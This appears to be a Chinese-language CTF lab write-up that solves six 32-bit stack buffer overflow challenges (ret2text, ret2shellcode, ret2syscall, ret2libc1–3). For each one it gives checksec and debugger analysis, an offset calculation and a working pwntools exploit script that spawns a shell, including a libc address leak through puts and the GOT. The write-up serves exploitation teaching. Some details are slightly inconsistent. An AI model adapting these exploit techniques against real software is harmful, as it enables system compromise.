# Level 1 Writeup

## ret2text复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制


![image-20230413204256822](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304132043972.png "checksec检查ret2text结果")

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术，在重定位后使可执行文件的某些部分（如全局偏移表（GOT）和程序链接表（PLT））成为只读，可以一定程度上防止重写函数指针和劫持控制流。
- 没有开启“栈金丝雀（stack canary）”技术，说明可执行程序易受到栈缓冲区溢出的影响。
- 开启了“No-eXecute”保护技术，将一些内存区域（如堆栈）标记为不可执行。
- 没有开启“独立位置可执行（Position Independent Executable）”技术，说明可执行文件运行时都在固定的位置加载。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230417110103303](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251052264.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，因此查找是否有可以利用的工具函数与字符串。先从字符串找起，使用IDA pro的`Alt+t`功能查找字符串`/bin/sh`，成功找到，确认其在程序中存在：

![image-20230417155342041](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304171553065.png)

![image-20230417155155065](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304171551108.png)

然后通过快捷键`X`，使用xrefs功能查找引用了该字符串的指令位置：

![image-20230417155414574](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251052167.png)

![image-20230417155930178](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304171559200.png)

可以看到在`secure()`函数第12行，调用了`system()`函数并传入了该字符串。得益于`system()`函数的特殊性质，此处可以直接作为缓冲区溢出的调用点。

![image-20230417222453437](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251052046.png)

查看对应系统调用的汇编源码，记录其起始位置`0x0804863A`。

因此构思获得shell的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
2. 覆盖`main()`函数的返回地址为`system("/bin/sh")`语句的地址。
3. 当`main()`函数执行完毕退出时，eip指针返回到`system("/bin/sh")`语句的地址继续执行，从而弹出一个shell供攻击者使用。

### 攻击复现

接下来实现攻击，首先要确定`main()`函数返回地址的存储位置。

由`get(s)`汇编代码得知，`s`在堆栈上的位置是相对esp寄存器计算的，所以需要通过调试确定在`call _gets`时esp的地址。

![image-20230417213824829](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304172138855.png)

![image-20230417214429598](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251052781.png)

通过在`call _gets`的地址`0x080486AE`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffcf00`，其存放的内容即字符串`s`的地址为`0xffffcf1c`；基址指针寄存器ebp的地址为`0xffffcf88`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf88-0xffffcf1c=0x6c`。此时内存结构如下图所示：

![image-20230418171910241](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251052408.png)

接下来编写的payload要做的就是通过`gets()`函数在`s`字符串地址开始写入0x6c长度任意数据，覆盖ebp（4个字节），最终改写`main()`函数的返回地址为上面所记录的`system(\bin\sh)`的地址`0x804863A`。如下图所示：

![image-20230423115955380](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251052509.png)

最后的payload如下：

```python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline('A' * (0x6c+4) + p32(target))
sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230417222746252](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304172227266.png)

## ret2shellcode复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 使用vmmap查看内存段权限
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230418171409400](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304181715199.png)

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“栈金丝雀（stack canary）”技术。
- 没有开启“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230418172044986](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053154.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，但是没有在程序中查找到`/bin/sh`字符串或`system()`函数等易于利用的工具。进一步分析程序，发现程序将输入的字符串`s`拷贝到`buf2`处，考虑`buf2`是否有一些利于利用的特殊性质。

![image-20230418172514969](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304181725995.png)

经过查找发现`buf2`在BSS段`0x0804A080`中，继续检查该内存位置的权限属性。

![image-20230418192259001](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053559.png)

对`main()`函数下断点，通过vmmap检查发现`0x0804A000`-`0x0804B000`具有可读可写可执行权限。那么通过`gets()`输入的内容在被拷贝到`buf2`后也可执行。

因此构思获得shell的攻击流程如下：

1. 构造shellcode
2. 通过`gets()`输入shellcode并构造缓冲区溢出攻击，劫持控制流。
3. 覆盖`main()`函数的返回地址为`buf2`的地址。
4. 当`main()`函数执行完毕退出时，eip指针返回到`buf2`中的shellcode继续执行，从而弹出一个shell供攻击者使用。

### 攻击复现

接下来实现攻击，同上一题，要先确定`main()`函数返回地址。

![image-20230418205135752](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053039.png)

![image-20230418205656888](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053577.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x08048593`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffcee0`，其存放的内容即字符串`s`的地址为`0xffffcefc`；基址指针寄存器ebp的地址为`0xffffcf68`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf68-0xffffcefc=0x6c`。此时内存结构如下图所示：

![image-20230419120251020](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053903.png)

接下来编写的payload要做的就是通过`gets()`函数在`s`字符串地址开始写入shellcode，并填充任意数据直到0x6c长度，覆盖ebp（4个字节），最终改写`main()`函数的返回地址为`buf2`的地址`0x0804A080`。如下图所示：

![image-20230419120525228](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053213.png)

最后的payload如下：

```python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode + b'A' * ((0x6c+4) - len(shellcode)) + p32(buf2_addr))
sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230419120619943](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304191206972.png)

## ret2syscall复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 通过ROPgadget工具查找需要的gadgets
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230419182517185](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053480.png)

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230419182748810](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304191827832.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，但是没有在程序中查找到`/bin/sh`字符串或`system()`函数等易于利用的工具；检查其内存权限属性，也没有找到额外的可执行内存段（如下图）。

![image-20230419183214617](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053714.png)

没有可以利用的代码也无法自己输入shellcode来获得shell，因此考虑使用ROP(Return Oriented Programming)方法，利用程序中已有的以`ret`结尾的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而利用`ret`控制子程序返回栈上原主程序地址的特性，达到连续执行多个gadgets控制程序的执行流程。

希望能够构造出系统调用如下：

```
execve("/bin/sh",NULL,NULL)
```

在汇编视角，则需要满足以下寄存器条件并发起系统中断

- eax = 0xb（`execve`的系统调用号）
- ebx = addr('/bin/sh')
- ecx = 0
- edx = 0

当构造好所需寄存器的值后，跳转到任意一个`int 0x80`地址发起系统中断即可实现一次`execve`系统调用。

为了构造寄存器的值，需要利用程序中已有的，以`ret`结尾的程序片段，实现多个片段间的连续跳转和利用，这种程序片段被称为gadgets。通过ROPgadget工具查找需要的gadgets：

![image-20230423110738249](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231107283.png)

控制eax的gadget采用`0x080bb196`位置的`pop eax; ret`。

![image-20230423111106472](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053628.png)

控制ebx、ecx和edx采用`0x0806eb90 `位置的`pop edx ; pop ecx ; pop ebx ; ret`。

![image-20230423111406420](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053028.png)

字符串“/bin/sh”程序中仅有一处，即`0x080be408`地址处。

![image-20230423111620018](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053623.png)

系统中断`int 0x80`在程序中也仅有溢出，即`0x08049421`地址处。

因此构思获得shell的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。

2. 覆盖`main()`函数的返回地址为控制eax的gadget地址

3. 在栈中后续内容继续填充希望`pop`进eax寄存器的内容`0xb`

4. 在栈中后续内容（控制eax的gadget的ret地址）继续填充为控制ebx、ecx和edx寄存器的gadget地址

5. 在栈中后续内容继续填充希望`pop`进ebx、ecx、edx寄存器的内容`0`、`0`和字符串“/bin/sh”的地址`0x080be408`

6. 在栈中后续内容（控制ebx、ecx、edx的gadget的ret地址）继续填充为`int 0x80`的地址

   当`main()`函数执行完毕退出时，eip指针返回到第一个gadget的地址并依次执行后续gadget，从而依次满足寄存器内容并最终发起系统中断从而调用`execve`弹出一个shell供攻击者使用

### 攻击复现

接下来实现攻击，同上一两题，要先确定`main()`函数返回地址。

![image-20230423115452588](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053566.png)

![image-20230423115621344](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053113.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x08048E96`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffcf20`，其存放的内容即字符串`s`的地址为`0xffffcf3c`；基址指针寄存器ebp的地址为`0xffffcfab`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcfab-0xffffcf3c=0x6c`。此时内存结构如下图所示：

![image-20230423120021465](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053762.png)

根据上述思路编写payload，构造内存结果如下：

![image-20230423165859531](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053124.png)

最后的payload如下：

```python
from pwn import *

sh = process('./ret2syscall')
pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
sh.sendline(b'A' * (0x6c+4) + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(binsh) + p32(int_0x80))
sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230423114713741](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053267.png)

## ret2libc1复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 查阅手册，利用libc中的函数
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230423171448401](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053961.png)

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230423171542475](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231715494.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，因此查找是否有可以利用的工具函数与字符串。先从字符串找起，使用IDA pro的`Alt+t`功能查找字符串`/bin/sh`：

![image-20230423171632865](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231716876.png)

字符串位置位于`0x08048720`。但是使用IDA快捷键`X`的xrefs功能并没有找到其在程序中的可利用调用。那么接下来手动搜索可利用的函数，如libc中的`system()`函数，可通过`Alt+t`查找`_system`：

![image-20230423172209258](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304231722274.png)

![image-20230423172227886](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053677.png)

在`secure()`函数中找到了对`system()`函数的调用，但传入的字符串"shell!?"，无法有效利用。那么需要利用程序引入的libc库函数`_system`并手动构造栈帧并完成函数调用。首先确认`_system`函数的位置：

![image-20230424103529766](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053692.png)

经过查找，发现其函数地址`0x08048460`。查阅文档，调用libc库函数中`_system`应满足如下栈结构：

1. `_system`函数的地址（在plt表中），即`0x08048460`
2. 一个返回地址
3. 想传入`_system`的字符串参数的地址

因此构思获得shell的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
2. 覆盖`main()`函数的返回地址为`_system`函数的地址`0x08048460`
3. 在后续填入一个32位的虚假返回地址
4. 在后续填入字符串`/bin/sh`的地址`0x08048720`
5. 当`main()`函数执行完毕退出时，eip指针返回到`_system`函数的地址并读入后续的虚假返回地址和字符串参数，并最终启动一个子进程弹出shell供攻击者使用

### 攻击复现

接下来实现攻击，同上面题目，要先确定`main()`函数返回地址。

![image-20230424105219836](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241052849.png)

![image-20230424105306288](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241053358.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x0804867E`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffced0`，其存放的内容即字符串`s`的地址为`0xffffceec`；基址指针寄存器ebp的地址为`0xffffcf58`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf58-0xffffceec=0x6c`。此时内存结构如下图所示：

![image-20230424105446557](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053669.png)

根据上述思路编写payload，构造内存结果如下：

![image-20230424222852528](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242228608.png)

最后的payload如下：

```python
from pwn import *

sh = process('./ret2libc1')
binsh = 0x8048720
system = 0x08048460
sh.sendline(b'a' * 112 + p32(system) + b'a' * 4 + p32(binsh))
sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230424110223191](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251053879.png)

## ret2libc2复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 查阅手册，利用libc中的函数
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 利用gadgets自行写入所需要的字符串参数
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230424150457551](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054000.png)

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro来查看反汇编程序源码：

![image-20230424150554617](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054806.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，因此查找是否有可以利用的工具函数与字符串。手动搜索可利用的函数，如libc中的`system()`函数，可通过`Alt+t`查找`_system`：

![image-20230424150725207](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054898.png)

![image-20230424150741756](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241507811.png)

![image-20230424151022807](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241510823.png)

在`secure()`函数中找到了对`system()`函数的调用，其`system`函数地址`0x08048490`，但传入的字符串"no_shell_QQ"，无法有效利用。但在反汇编程序中搜索字符串，并不能找到字符串`/bin/sh`，需要自己输入，考虑到程序`main()`函数中使用了`gets()`函数，可以进行利用。

![image-20230424151310504](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304241513523.png)

经过查找，发现libc中`_gets`在plt表中映射位置`0x08048460`。接着要找一段可读可写的内存作为`_gets`函数的参数，也是`/bin/sh`将要写入的位置，一般选择用来存放程序中未初始化的全局变量的bss段（bss segment）段中的位置。

![image-20230424153940192](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054257.png)

查看整个bss段，恰好发现`0x0804A080`处存在一个buf2的buffer。因此构思获得shell的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
2. 覆盖`main()`函数的返回地址为`_gets`函数的地址`0x08048460`
3. 后续填入`_system`函数的地址`0x08048490`作为`_gets`函数的返回地址的填充
4. 后续填入buf2的地址，作为`_gets`函数的参数，同时作为`_system`函数的返回地址的填充
5. 后续填入buf2的地址，作为`_system`函数的参数
6. 当`main()`函数执行完毕退出时，eip指针返回到`_gets`的地址并读入后续的虚假返回地址和buf2的地址，读入新的输入`/bin/sh`后，eip指针返回到`_system`函数的地址并读入后续的虚假返回地址和buf2处的字符串，并最终启动一个子进程弹出shell供攻击者使用

### 攻击复现

接下来实现攻击，同上面题目，要先确定`main()`函数返回地址。

![image-20230424154403878](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054776.png)

![image-20230424154433246](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054578.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x080486BA`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffced0`，其存放的内容即字符串`s`的地址为`0xffffceec`；基址指针寄存器ebp的地址为`0xffffcf58`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf58-0xffffceec=0x6c`。此时内存结构如下图所示：

![image-20230424105446557](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054230.png)

根据上述思路编写payload，构造内存结果如下：

![image-20230424222956778](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242229806.png)

最后的payload如下：

```python
from pwn import *

sh = process('./ret2libc2')
buf2 = 0x804a080
gets = 0x08048460
system = 0x08048490
sh.sendline(b'a' * 112 + p32(gets) + p32(system) + p32(buf2) + p32(buf2))
sh.sendline(b'/bin/sh')
sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230424155052755](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054681.png)

## ret2libc3复现与分析

### 技术点

- checksec检查可执行文件与内核安全属性
- 使用反汇编工具（IDA pro）查找缓冲区溢出入口和可利用的源码片段
- 使用二进制调试工具（gdb）查看寄存器与内存内容
- 泄露共享库基地址
- 通过 got 表泄露共享库中函数的偏移地址
- 利用gadgets构造栈帧，通过ROP调用系统调用
- 计算需要覆写的返回地址的偏移
- payload构造

### 分析

首先通过checksec检查可执行文件的保护机制

![image-20230424205804407](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242058445.png)

能够得知以下信息：

- 可执行文件为一个32位的英特尔x86可执行文件，使用小端序编码。
- 开启了“部分Relocation Read-Only”技术。
- 没有开启“栈金丝雀（stack canary）”技术。
- 开启了“No-eXecute”保护技术。
- 没有开启“独立位置可执行（Position Independent Executable）”技术。

接下来通过IDA pro查看反汇编反编译源码：

![image-20230424210152398](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304242101422.png)

可以看主函数中明显的缓冲区溢出漏洞入口`get(s)`，因此查找是否有可以利用的工具函数与字符串。但是没有在程序中查找到`/bin/sh`字符串或`system()`函数等易于利用的工具。根据本题要求，尝试利用外部的libc中比较齐全的代码。

想要利用作为外部共享库的libc，首先要考虑的就是其基地址，只有先泄露出动态链接库的基地址才能通过固定的偏移量调用库函数。仔细调查反汇编出的源码，发现在`main()`函数中调用了`puts()`函数，想到可以使用`puts()`函数泄露出libc基地址。

因此构思获得libc基地址的攻击流程如下：

1. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
2. 覆盖`main()`函数的返回地址为`puts()`函数的地址
3. 后续填入`main()`函数地址作为`puts()`函数的返回地址，以便`puts()`函数结束后重新运行`main()`函数
4. 后续填入got表中的`__libc_start_main`函数指针地址，以通过puts将动态运行时真实的`__libc_start_main`函数地址打印出来
5. 当`main()`函数执行完毕退出时，eip指针返回到`puts()`函数的地址并打印出`__libc_start_main`函数地址打。
6. 当`puts()`函数执行完毕，eip指针返回到`main()`函数的地址重新开始执行

接着需要通过`__libc_start_main`函数地址计算出libc基地址，从而获得`system`函数和"\bin\sh"字符串的地址。因此构思获得shell的攻击流程如下：

1. 接收上轮输出的`__libc_start_main`函数
2. 通过LibcSearcher工具计算出libc基地址以及进一步获得`system`函数和"\bin\sh"字符串的地址
3. 通过`gets()`构造缓冲区溢出攻击，劫持控制流。
4. 覆盖`main()`函数的返回地址为`system`函数的地址
5. 在后续填入一个32位的虚假返回地址
6. 在后续填入字符串`/bin/sh`的地址`0x08048720`
7. 当`main()`函数执行完毕退出时，eip指针返回到`system`函数的地址并读入后续的虚假返回地址和字符串参数，并最终启动一个子进程弹出shell供攻击者使用

### 攻击复现

接下来实现攻击，同上面题目，要先确定`main()`函数返回地址。

![image-20230424222544892](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054940.png)

![image-20230424222643207](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054589.png)

使用与上一题一样的步骤，在`call _gets`的地址`0x0804868A`处下断点，可以看到：栈指针寄存器esp此时的地址为`0xffffced0`，其存放的内容即字符串`s`的地址为`0xffffceec`；基址指针寄存器ebp的地址为`0xffffcf58`。通过计算可得，s 相对于 ebp 的偏移为 `0xffffcf58-0xffffceec=0x6c`。此时内存结构如下图所示：

![image-20230424105446557](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054100.png)

根据上述思路编写第一轮运行的payload，构造内存结果如下：

![image-20230425154007262](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251540314.png)

接下来因为程序重新从main开始运行，因此需要继续构造第二轮运行的payload，需构造内存结果如下：

![image-20230424223330737](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054888.png)

最后的payload如下：

```python
from pwn import *
from LibcSearcher import LibcSearcher

elf_ret2libc3 = ELF('./ret2libc3')

sh = process('./ret2libc3')

plt_puts = elf_ret2libc3.plt['puts']
got_libc_start_main = elf_ret2libc3.got['__libc_start_main']
addr_main = elf_ret2libc3.symbols['main']
offset = 0x6c + 4

payload = flat([b'a' * offset, plt_puts, addr_main, got_libc_start_main])
sh.sendlineafter('Can you find it !?', payload)
libc_start_main_addr = u32(sh.recv(4))

print('libc_start_main_addr: ' + hex(libc_start_main_addr))

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

运行payload脚本，可以成功得到shell。

![image-20230424223451333](https://raw.githubusercontent.com/SuperMaxine/pic-repo/master/img/202304251054343.png)